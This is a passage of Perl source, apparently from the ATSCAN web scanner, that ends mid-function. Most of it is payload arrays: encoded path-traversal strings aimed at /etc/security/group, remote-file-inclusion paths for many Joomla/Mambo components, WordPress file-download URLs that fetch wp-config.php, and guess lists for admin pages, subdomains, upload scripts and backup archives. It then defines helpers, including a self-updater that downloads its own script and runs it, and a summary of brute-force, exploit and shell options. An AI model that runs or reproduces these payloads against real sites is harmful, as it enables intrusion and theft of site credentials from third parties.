..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","%2F%2Fetc/security/group","....%2F%2Fetc/security/group","....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","%2F%2Fetc/security/group%00","....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","//etc/security/group","....//etc/security/group","....//....//etc/security/group","....//....//....//etc/security/group","....//....//....//....//etc/security/group","....//....//....//....//....//etc/security/group","....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//....//etc/security/group","//etc/security/group%00","....//etc/security/group%00","....//....//etc/security/group%00","....//....//....//etc/security/group%00","....//....//....//....//etc/security/group%00","....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//....//etc/security/group%00");
############################################################################################################################################################################################
############################################################################################################################################################################################
## XSS
my @XSS = ("%27");
############################################################################################################################################################################################
############################################################################################################################################################################################
## RFI
my @RFI = ("/components/com_flyspray/startdown.php?file=", "/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=", "/components/com_simpleboard/file_upload.php?sbp=", "/components/com_hashcash/server.php?mosConfig_absolute_path=", "/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=", "/components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=", "/components/com_performs/performs.php?mosConfig_absolute_path=", "/components/com_forum/download.php?phpbb_root_path=", "/components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=", "/components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=", "/components/minibb/index.php?absolute_path=", "/components/com_smf/smf.php?mosConfig_absolute_path=", "/modules/mod_calendar.php?absolute_path=", "/components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=", "/components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=", "/components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=", "/components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=", "/administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=", "/administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?mosConfig_live_site=", "/administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=", "/administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=", "/components/com_mambatstaff/mambatstaff.php?mosConfig_absolute_path=", "/components/com_securityimages/configinsert.php?mosConfig_absolute_path=", "/components/com_securityimages/lang.php?mosConfig_absolute_path=", "/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=", "/components/com_galleria/galleria.html.php?mosConfig_absolute_path=", "/akocomments.php?mosConfig_absolute_path=", "/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=", "/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=", "/administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=", "/components/com_zoom/classes/fs_unix.php?mosConfig_absolute_path=", "/components/com_zoom/includes/database.php?mosConfig_absolute_path=", "/administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=", "/components/com_fm/fm.install.php?lm_absolute_path=", "/administrator/components/com_mambelfish/mambelfish.class.php?mosConfig_absolute_path=", "/components/com_lmo/lmo.php?mosConfig_absolute_path=", "/administrator/components/com_webring/admin.webring.docs.php?component_dir=", "/administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=", "/administrator/components/com_babackup/classes/Tar.php?mosConfig_absolute_path=", "/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=", "/components/com_mambowiki/MamboLogin.php?IP=", "/administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=", "/administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=", "/components/com_cpg/cpg.php?mosConfig_absolute_path=", "/components/com_moodle/moodle.php?mosConfig_absolute_path=", "/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path=", "/components/com_mospray/scripts/admin.php?basedir=", "/administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=", "/administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path=", "/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=", "/components/com_reporter/processor/reporter.sql.php?mosConfig_absolute_path=", "/components/com_madeira/img.php?url=", "/components/com_bsq_sitestats/external/rssfeed.php?baseDir=", "/com_bsq_sitestats/external/rssfeed.php?baseDir=", "/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=", "/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/admin.jjgallery.php?mosConfig_absolute_path=", "/components/com_jreviews/scripts/xajax.inc.php?mosConfig_absolute_path=", "/com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_chronocontact/excelwriter/PPS/File.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/PPS.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Format.php?mosConfig_absolute_path=", "/index.php?option=com_custompages&cpage=", "/component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=", "/components/com_facileforms/facileforms.frame.php?ff_compath=", "/administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=", "/administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/includes/heatmap/main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/includes/overview/main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/Recly/Clickheat/Cache.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/Recly/common/GlobalVariables.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=", "/administrator/components/com_dadamail/config.dadamail.php?GLOBALS['mosConfig_absolute_path']=", "/administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=", "/administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=", "/administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=", "/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=", "/components/com_jd-wiki/lib/tpl/default/main.php?mosConfig_absolute_path=", "/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=", "/components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_path=", "/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=", "/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path=", "/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=", "/components/com_reporter/reporter.logic.php?mosConfig_absolute_path=", "/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=", "/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=", "/components/com_joomlaboard/file_upload.php?sbp=", "/components/com_thopper/inc/contact_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/itemstatus_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/projectstatus_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/request_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/responses_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/urgency_type.php?mosConfig_absolute_path=", "/components/com_mosmedia/media.tab.php?mosConfig_absolute_path=", "/components/com_mosmedia/media.divs.php?mosConfig_absolute_path=", "/modules/mod_as_category/mod_as_category.php?mosConfig_absolute_path=", "/modules/mod_as_category.php?mosConfig_absolute_path=", "/components/com_articles.php?absolute_path=", "/classes/html/com_articles.php?absolute_path=", "/administrator/components/com_jpack/includes/CAltInstaller.php?mosConfig_absolute_path=", "/templates/be2004-2/index.php?mosConfig_absolute_path=", "/libraries/pcl/pcltar.php?g_pcltar_lib_dir=", "/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=", "/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=", "/administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=", "/components/com_slideshow/admin.slideshow1.php?mosConfig_live_site=", "/administrator/components/com_panoramic/admin.panoramic.php?mosConfig_live_site=", "/administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=", "/administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=", "/components/com_mp3_allopass/allopass.php?mosConfig_live_site=", "/components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=", "/administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/reports.html.php?mosConfig_absolte_path=", "/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/com_color/admin.color.php?mosConfig_live_site=", "/administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=", "/administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=", "/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=", "/index.php?option=com_adsmanager&mosConfig_absolute_path=", "/com_ponygallery/admin.ponygallery.html.php?mosConfig_absolute_path=", "/com_magazine_3_0_1/magazine.functions.php?config=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=", "/administrator/components/com_universal/includes/config/config.html.php?mosConfig_absolute_path=", "/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=");
############################################################################################################################################################################################
############################################################################################################################################################################################
#ADF WP WORDPRESS
my @ADFWP =("/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
"/wp-content/force-download.php?file=../wp-config.php",
"/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10",
"/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php",
"/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php",
"/wp-content/themes/markant/download.php?file=../../wp-config.php",
"/wp-content/themes/yakimabait/download.php?file=./wp-config.php",
"/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php",
"/wp-content/themes/felis/download.php?file=../wp-config.php",
"/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php",
"/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php",
"/wp-content/themes/epic/includes/download.php?file=wp-config.php",
"/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php",
"/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php",
"/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php",
"/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php",
"/wp-content/themes/lote27/download.php?download=../../../wp-config.php",
"/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php",
"/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php",
"/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/wamp/www/wp-config.php",
"/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/wp-config.php",
"/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php",
"/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php",
"/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php");
############################################################################################################################################################################################
############################################################################################################################################################################################
## ADMIN PAGE
my @ADMIN=("/admin/", "/admin/login.php", "/myadmin/", "/acceso/", "/administrator/", "/admin1/", "/admin2/", "/admin3/", "/admin4/", "/admin5/", "/usuarios/", "/usuario/", "/administrador/", "/administrateur/", "/moderator/", "/webadmin/", "/adminarea/", "/bb-admin/", "/adminLogin/", "/admin_area/", "/panel-administracion/", "/instadmin/", "/memberadmin/", "/administratorlogin/", "/adm/", "/wp-login.php", "/admin/account.php", "/admin/index.php", "/admin/admin.php", "/admin/account.php", "/admin_area/admin.php", "/admin_area/login.php", "/siteadmin/login.php", "/siteadmin/index.php", "/siteadmin/login.html", "/admin/account.html", "/admin/index.html", "/admin/login.html", "/admin/admin.html", "/admin_area/index.php", "/bb-admin/index.php", "/bb-admin/login.php", "/bb-admin/admin.php", "/admin/home.php", "/admin_area/login.html", "/admin_area/index.html", "/admin/controlpanel.php", "/admin.php", "/admincp/index.asp", "/admincp/login.asp", "/admincp/index.html", "/admin/account.html", "/administracion", "/adminpanel.html", "/webadmin.html", "/webadmin/index.html", "/webadmin/admin.html", "/webadmin/login.html", "/admin/admin_login.html", "/admin_login.html", "/panel-administracion/login.html", "/admin/cp.php", "/cp.php", "/administrator/index.php", "/administrator/login.php", "/nsw/admin/login.php", "/webadmin/login.php", "/admin/admin_login.php", "/admin_login.php", "/administrator/account.php", "/administrator.php", "/admin_area/admin.html", "/pages/admin/admin-login.php", "/admin/admin-login.php", "/admin-login.php", "/bb-admin/index.html", "/bb-admin/login.html", "/acceso.php", "/bb-admin/admin.html", "/admin/home.html", "/login.php", "/modelsearch/login.php", "/moderator.php", "/moderator/login.php", "/moderator/admin.php", "/account.php", "/pages/admin/admin-login.html", "/admin/admin-login.html", "/admin-login.html", "/controlpanel.php", "/admincontrol.php", "/admin/adminLogin.html", "/adminLogin.html", "/admin/adminLogin.html", "/home.html", "/rcjakar/admin/login.php", "/adminarea/index.html", "/adminarea/admin.html", "/webadmin.php", "/webadmin/index.php", "/webadmin/admin.php", "/admin/controlpanel.html", "/admin.html", "/admin/cp.html", "cp.html", "/adminpanel.php", "/moderator.html", "/administrator/index.html", "/administrator/login.html", "/user.html", "/administrator/account.html", "/administrator.html", "/login.html", "/modelsearch/login.html", "/moderator/login.html", "/adminarea/login.html", "/panel-administracion/index.html", "/panel-administracion/admin.html", "/modelsearch/index.html", "/modelsearch/admin.html", "/admincontrol/login.html", "/adm/index.html", "adm.html", "/moderator/admin.html", "/user.php", "account.html", "/controlpanel.html", "/admincontrol.html", "/panel-administracion/login.php", "/wp-login.php", "/adminLogin.php", "/admin/adminLogin.php", "/home.php", "/admin.php", "/adminarea/index.php", "/adminarea/admin.php", "/adminarea/login.php", "/panel-administracion/index.php", "/panel-administracion/admin.php", "/modelsearch/index.php", "/modelsearch/admin.php", "/admincontrol/login.php", "/adm/admloginuser.php", "/admloginuser.php", "/admin2.php", "/admin2/login.php", "/admin2/index.php", "/usuarios/login.php", "/adm/index.php", "/adm.php", "/affiliate.php", "/adm_auth.php", "/memberadmin.php", "/administratorlogin.php");
############################################################################################################################################################################################
############################################################################################################################################################################################
## SUBDOMAINS
my @SUBDOMAIN =("about.", "abose.", "acme.", "ad.", "admanager.", "admin.", "admins.", "administrador.", "administrateur.", "administrator.", "ads.", "adsense.", "adult.", "adwords.", "affiliate.", "affiliatepage.", "afp.", "analytics.", "android.", "shop.", "echop.", "blog.", "tienda.", "answer.", "ap.", "api.", "apis.", "app.", "bank.", "blogs.", "client.", "clients.", "community.", "content.", "cpanel.", "dashbord.", "data.", "developer.", "developers.", "dl.", "docs.", "documents.", "download.", "downloads.", "encrypted.", "email.", "webmail.", "mail.", "correo.", "ftp.", "forum.", "forums.", "feed.", "feeds.", "file.", "files.", "gov.", "home.", "help.", "invoice.", "invoises.", "items.", "js.", "es.", "it.", "en.", "fr.", "ar.", "legal.", "iphone.", "lab.", "labs.", "list.", "lists.", "log.", "logs.", "errors.", "net.", "mysql.", "mysqldomain.", "net.", "network.", "news.", "ns.", "ns1.", "ns2.", "ns3.", "ns4.", "ns5.", "org.", "panel.", "partner.", "partners.", "pop.", "pop3.", "private.", "proxies.", "public.", "reports.", "root.", "rss.", "prod.", "prods.", "sandbox.", "search.", "server.", "servers.", "signin.", "signup.", "login.", "smtp.", "srntp.", "ssl.", "soap.", "stat.", "statics.", "store.", "status.", "survey.", "sync.", "system.", "text.", "test.", "webadmin.", "webdisk.", "xhtml.", "xhtrnl.", "xml.");
############################################################################################################################################################################################
############################################################################################################################################################################################
## UPLOAD FILES
my @UPLOAD = ("/up.php", "/up1.php", "up/up.php", "/site/up.php", "/vb/up.php", "/forum/up.php", "/blog/up.php", "/upload.php", "/upload1.php", "/upload2.php", "/vb/upload.php", "/forum/upload.php", "blog/upload.php", "site/upload.php", "download.php");
############################################################################################################################################################################################
############################################################################################################################################################################################
## ZIP FILES
my @ZIP = ("/backup.tar.gz", "/backup/backup.tar.gz", "/backup/backup.zip", "/vb/backup.zip", "/site/backup.zip", "/backup.zip", "/backup.rar", "/backup.sql", "/vb/vb.zip", "/vb.zip", "/vb.sql", "/vb.rar", "/vb1.zip", "/vb2.zip", "/vbb.zip", "/vb3.zip", "/upload.zip", "/up/upload.zip", "/joomla.zip", "/joomla.rar", "/joomla.sql", "/wordpress.zip", "/wp/wordpress.zip", "/blog/wordpress.zip", "/wordpress.rar");
############################################################################################################################################################################################
############################################################################################################################################################################################
## FIN INFO MENU
sub finInfoMenu {
  print "\033[1;37m[+]-----------------------------------------------------------------------[+]\n";  
  print "\033[0;37m[ ]-----------------------------------------------------------------------\n";  
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## CHECK VERSION
sub checkVersion {
  my $URL = 'https://github.com/AlisamTechnology/ATSCAN/blob/master/version.log';
  my $request = HTTP::Request->new('GET', $URL);
  my $response = $ua->request($request);
  my $html = $response->content;
  (my $gitversion) = ($html =~ /version(.*)Stable/);
  print "\033[1;37m[:]-----------------------------------------------------------------------[:]\n";
  $gitversion = "version".$gitversion."Stable";
  if ($gitversion eq $existantVersion) {
	print "\033[0;32m[!] OK! Last $gitversion No need to update!\n";
  }else{	
	print "\033[0;31m[!] $existantVersion Update Needed to ";
	print "\033[0;32m$gitversion!\n";
    print "\033[0;33m[!] Do you want to update tool? [Y/n]: ";
    my $resp=<STDIN>;
    chomp ($resp);
	my $yes ='Y|y|yes|YES|Yes';
	if ($resp =~ /$yes/) {
      my $URL = "https://raw.githubusercontent.com/AlisamTechnology/ATSCAN/master/atscan.pl";
      my $request = HTTP::Request->new('GET', $URL);
      my $response = $ua->request($request);
      my $html = $response->content;
	  if ($response->is_success) {
	    if (-e '/usr/share/doc/ATSCAN/atscan.pl') {
		  unlink '/usr/share/doc/ATSCAN/atscan.pl';
		  open (FILE, '>>/usr/share/doc/ATSCAN/atscan.pl');
          print FILE $response->content;
          close (FILE);
		}else{
		  unlink 'atscan.pl';
		  open (FILE, '>>atscan.pl');
          print FILE $response->content;
          close (FILE);
	    }
	    print "\033[0;32m[!] Tool updeted with success and will restart now!\n";
		sleep(2);
	    if (-e '/usr/share/doc/ATSCAN/atscan.pl') {
	      system("chmod +x /usr/share/doc/ATSCAN/atscan.pl | atscan");
		}else{
		  system("chmod +x atscan.pl | perl ./atscan.pl");
		  exit();
		}	     
      }else{
	    print "\033[0;31m[!] Can not connect to the server!\n";
	  }
	}
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## TIMER
sub timer {
  my ($sec,$min,$hr) = localtime();
  print "[";
  print "$hr:$min:$sec";
  print "] ";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## TIMER
sub removeProtocol {
  my $URL=$_[0];
  my %replace = (
    'http://' => '',
    'https://' => '',
  );
  $URL =~ s/$_/$replace{$_}/g for keys %replace;
  return $URL;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SCAN INFO
sub osinfo {
  use Config;
  print "\033[1;33m[:] GROUP:: ";
  print "\033[0;36mALISAM TECHNOLOGY SCANNER\n";
  print "\033[1;33m[:] TOOL:: ";
  print "\033[0;36mATSCAN $existantVersion\n";
  print "\033[1;33m[:] PATH:: ";
  print "\033[0;36m$Bin/",basename($0)," \n";
  print "\033[1;33m[:] PERL VERSION:: ";
  print "\033[0;36m$^V \n";
  print "\033[1;33m[:] PLATFORM:: ";
  print "\033[0;36m$Config{osname} ";
  print "$Config{archname}\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ADVISE
sub advise {
  my $lalwmali = ",basename($0),";
  if ($lalwmali =~ m/\/usr\/share\/doc/i) {
    print "\033[0;33m[!] Usage: atscan <option> \n";
    print "[!] Help: atscan [--help | -h]\n";
  }else{
    print "\033[0;33m[!] Usage: perl ./",basename($0)," <option> \n";
    print "[!] Help: perl ./",basename($0)," [--help | -h] \n";
  } 
  exit;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## FORWAIT
sub forwait {
  progressbar();
  print "\033[0;33m[!] Please wait...\033[0;37m\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## PROGRESS BAR
sub progressbar {
  use utf8;
  $| = 1;
  binmode STDOUT, ":utf8";
  print "\033[0;34m[!] ";
  timer();
  my $poop  = "::";
  for (1..30) {
    select(undef, undef, undef, 0.25);
    print "$poop";
  }
  print"\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SCAN DETAILS
sub scanDetail {
  if (defined $Target) {
    print "\033[1;33m[!] TARGET:: ";
    print "\033[0;36m$Target ";
	if ($Target =~ m/.txt/i){
	  my $file=$Target;
	  print "[";
	  countLists($Target);
	  print " Target(s) found]";
    }
	print "\n";
  }
  #########################################
  #########################################
  if (defined $rangip) {
    print "\033[1;33m[!] TARGET:: ";
    print "\033[0;36mRange [$rangip]\n";
  }
  #########################################
  #########################################
  print "\033[1;33m[:] PROXY:: ";
  if ((!defined $tor) && (!defined $proxy)) {
    print "\033[0;36mNo!";
  }else{
    if (defined $tor) { print "\033[0;36mTor Proxy";}
    if (defined $proxy) {
	  print "\033[0;36m$proxy";
	  if (substr($proxy, -4) eq '.txt') {
	    my $file = $proxy;
	    countProxies($file);
	  }
	}
	if (defined $random) { print "\033[0;36m[Random Proxy]";}
  }
  print "\n";
  #########################################
  #########################################
  if (defined $password) {
    print "\033[1;33m[:] LIST:: ";
    print "\033[0;36m[$password][";
	my $file=$password;
	countLists($file);
	print "\033[0;36m]\n";
  }
  #########################################
  #########################################
  if ((defined $misup) || (defined $validText) || (defined $ifinurl)) {
    print "\033[1;33m[:] VALIDATION:: ";
    if (defined $validText) { 
      print "\033[0;36m$validText ";
    }
    if (defined $misup) { 
      print "\033[0;36m/HTTP/1.1 200 ";
    }
	if (defined $ifinurl) { 
      print "\033[0;36m/Validate Url ";
    }
    print "\n";
  }
  #########################################
  #########################################
  if ((defined $mmd5) || (defined $mdecode64) || (defined $mencode64) || (defined $mdom) || (defined $exploit) || (defined $replace)) {
    print "\033[1;33m[:] EXPLOITATION:: ";
    if (defined $mmd5) {
      print "\033[0;36mMD5 ";
	}
	if (defined $mencode64) {
      print "\033[0;36m/Encode Base64 ";
	}
	if (defined $mdecode64) {
      print "\033[0;36m/Decode Base64 ";
	}
    if (defined $mdom) {
      print "\033[0;36m/Remove parameters ";
    }
	if ((defined $replace) && (defined $with)){
      print "\033[0;36m/Replace  ";
	}
    if (defined $exploit){
      print "\033[0;36m/[";
      my $file = $Bin."/aTexploits.txt";
	    countLists($file);
      print "\033[0;36m Exploit/s Found!]";
    }
    print "\n";
  }
  #########################################
  #########################################
  if ((defined $xss) || (defined $lfi) || (defined $adminPage) || (defined $JoomRfi) || (defined $WpAfd) || (defined $mports) || (defined $mupload) || (defined $mzip) || (defined $eMails) || (defined $joomBf) || (defined $WpBf)) {
    print "\033[1;33m[:] SCAN:: ";
    if (defined $xss) {
      print "\033[0;36m/Xss ";
	  if (defined $p){
        print "\033[0;36m[Vul Param: $p] ";
	  }
    }
    if (defined $lfi) {
      print "\033[0;36m/Lfi ";
    }
    if (defined $adminPage) {
      print "\033[0;36m/Admin ";
    }
    if (defined $JoomRfi) {
      print "\033[0;36m/Rfi ";
    }
    if (defined $WpAfd) {
      print "\033[0;36m/Adf ";
    }
    if (defined $mports) {
      print "\033[0;36m/Ports ";
	  
      if (defined $mbasic) {
        if (defined $tcp) { print "Basic tcp"; }
        if (defined $udp) { print "Basic udp"; }
        if (defined $all) { print "Basic tcp+udp";}
	  }
      if (defined $mcomplete) {
        if (defined $tcp) { print "Complete tcp";}
        if (defined $udp) { print "Complete udp";}
        if (defined $all) { print "Complete tcp+udp"; }
	  }
      if (defined $muser) {
        if (defined $tcp) { print "Selective tcp";}
        if (defined $udp) { print "Selective udp";}
        if (defined $all) { print "Selective tcp+udp";}
	  }
    }
    if (defined $mupload) {
      print "\033[0;36m/Upload ";
    }
    if (defined $mzip) {
      print "\033[0;36m/Zip ";
    }
    if (defined $eMails) {
      print "\033[0;36m/E-mails ";
    }
	if (defined $WpBf) {
      print "\033[0;36m/WP Brute Force ";
    }
	if (defined $joomBf) {
      print "\033[0;36m/Joom Brute Force ";
    }
    print "\n";
  } 
  #########################################
  #########################################
  if ((defined $msites) || (defined $WpSites) || (defined $JoomSites) || (defined $subdomain)){
    print "\033[1;33m[:] GET:: ";
    if (defined $msites) { 
      print "\033[0;36m/Server sites ";
    }
    if (defined $WpSites) { 
      print "\033[0;36m/WP sites ";
    }
    if (defined $JoomSites) { 
      print "\033[0;36m/JOOM sites ";
    }
    if (defined $subdomain) { 
      print "\033[0;36m/Subdomains ";
    }
    print "\n";
  }
  #########################################
  #########################################
  if (defined $shell) {
    print "\033[1;33m[:] SHELL:: ";
    print "\033[0;36m$shell \n";
  }
  if (defined $mlevel) {
    print "\033[1;33m[:] SCAN LEVEL:: ";
